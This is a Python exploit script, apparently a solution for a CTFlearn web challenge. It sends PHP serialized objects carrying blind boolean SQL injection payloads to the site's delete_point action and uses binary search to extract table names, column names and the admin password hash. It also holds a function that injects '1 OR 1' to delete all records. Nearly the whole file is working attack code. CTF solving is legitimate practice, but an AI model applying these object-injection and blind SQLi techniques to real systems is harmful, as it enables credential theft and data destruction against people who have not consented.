import requests, urllib, re, sys

url_base = "https://web.ctflearn.com/grid/controller.php"
url_login= url_base+"?action=login"
url_debug= url_base+"?action=debug"
url_delete= url_base+"?action=delete_point&point="
url_addpoint = url_base+"?action=add_point"

sessid = requests.Session()

payload_base = 'O:5:"point":1:{s:2:"ID";s:@LENGTH@:"@QUERY@";};'
init_array = []
sillent = False
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\0010123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

admin_hash_payload = "@ID@ AND Ascii(substring((SELECT password FROM user WHERE username='admin' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
tables_payload = "@ID@ AND Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
columns_user_payload = "@ID@ AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
columns_point_payload = "@ID@ AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'point' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"

def printInPlace(alert):
	if fancy_console:
		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
		sys.stdout.flush();
	return fancy_console

def isLogged():
	debug = sessid.get(url_debug)
	i = debug.text.find("[user]")
	return False if i==-1 else True

def createPayload( query ):
	return payload_base.replace("@LENGTH@", str(len(query))).replace("@QUERY@", query)

def sendPayload ( query ):
	if sillent == False: print ("exec: WHERE ID= {}".format(query))
	payload = createPayload(query)
	delete = sessid.get(url_delete+payload)
	return findIDs(delete.text)

def logIn(login_info):
	print ("loggin in: ", login_info)
	sessid.post(url_login, data=login_info, allow_redirects=False)
	return

def findIDs(text):
	regex = re.compile(r"ID:\s(\d{6})")
	matches = regex.findall(text)
	return matches

def addPoints():
	alert = "      [[Adding points]]"
	if printInPlace(alert) == False and sillent == False: 
		print("[[Adding points]]")
	for x in range(1, 30):
		point = {'x': 0, 'y': 0}
		sessid.post(url_addpoint, data=point, allow_redirects=False)
	printInPlace(" "*len(alert))
	return

def tryPayload(str):
	global init_array
	if(len(init_array) <= 1):
		addPoints()
		init_array = sendPayload("1")
	oldLen = len(init_array)
	init_array = sendPayload(str)
	return oldLen != len(init_array)

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
	a = 0
	b = len(alphabet)-1
	while (a < b):
		mid = (a+b)//2
		c = alphabet[mid]
		printInPlace(c)
		if tryPayload(payload
			.replace("@cORD@", str(ord(c)))
			.replace("@ID@", str(init_array[0]))
			): a = mid + 1
		else:
			b = mid
	return alphabet[a]


def findNames(payload, alphabet):
	for result_offset in range(0, 10):
		result = ""
		pl = payload.replace("@rOFFSET@", str(result_offset))
		for word_offset in range(1, 40):
			pl2 = pl.replace("@wOFFSET@", str(word_offset))
			c = findName(pl2, alphabet)
			if c == alphabet[0]: break
			sys.stdout.write(c)
			sys.stdout.flush
			result+=c
		print(" ")
		if len(result) <= 1: break
	return


def findTables():
	print ("..:: Searching for table names ::..")
	findNames(tables_payload, advancedAlphabet)

def findUserColumns():
	print ("..:: Searching for column names in user ::..")
	findNames(columns_user_payload, advancedAlphabet)

def findPointColumns():
	print ("..:: Searching for column names in point::..")
	findNames(columns_point_payload, advancedAlphabet)


def findAdminHash():
	print ("..:: Searching for Admin hash ::..")
	findNames(admin_hash_payload, HEXAlphabet)


def deletePoints():
	sendPayload("1 OR 1")
	exit(0)



fancy_console = True # Turn on fancy terminal output
sillent = True # Turn off debugging mode
logIn({'uname': 'zsd', 'pass': 'zsd'})


if isLogged():
	print("Sucessfully logged in")
else:
	exit("Unsuccessful login!")


#deletePoints();
#addPoints();
init_array = sendPayload("1");

findTables();
findPointColumns();
findUserColumns();
findAdminHash();
